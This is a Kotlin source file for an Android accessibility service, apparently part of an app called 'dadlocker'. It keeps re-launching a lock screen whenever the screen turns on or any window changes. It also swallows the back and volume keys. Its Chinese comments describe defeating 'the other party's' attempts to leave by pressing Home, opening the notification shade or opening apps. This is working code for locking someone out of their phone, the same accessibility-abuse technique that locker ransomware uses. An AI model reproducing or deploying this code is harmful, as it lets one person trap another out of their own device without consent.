package com.example.dadlocker

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent

class LockerService : AccessibilityService() {

    // 亮屏时立刻拉回锁屏界面（对付电源键熄屏）
    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_SCREEN_ON && Prefs.isActive(context)) {
                LockActivity.start(context)
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_ON))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!Prefs.isActive(this)) return
        when (event.eventType) {
            // 对方按Home、切后台、下拉通知栏、打开任何App，
            // 窗口一变就立刻拉回锁屏界面
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOWS_CHANGED -> {
                val pkg = event.packageName?.toString() ?: return
                if (pkg == packageName) return // 自己的锁屏界面不处理
                LockActivity.start(this)
            }
        }
    }

    // 吞掉返回键和音量键（按键事件不过滤给系统）
    override fun onKeyEvent(event: KeyEvent): Boolean {
        if (!Prefs.isActive(this)) return false
        return when (event.keyCode) {
            KeyEvent.KEYCODE_BACK,
            KeyEvent.KEYCODE_VOLUME_UP,
            KeyEvent.KEYCODE_VOLUME_DOWN,
            KeyEvent.KEYCODE_VOLUME_MUTE -> true
            else -> false
        }
    }

    override fun onInterrupt() {}

    override fun onUnbind(intent: Intent?): Boolean {
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
        return super.onUnbind(intent)
    }
}
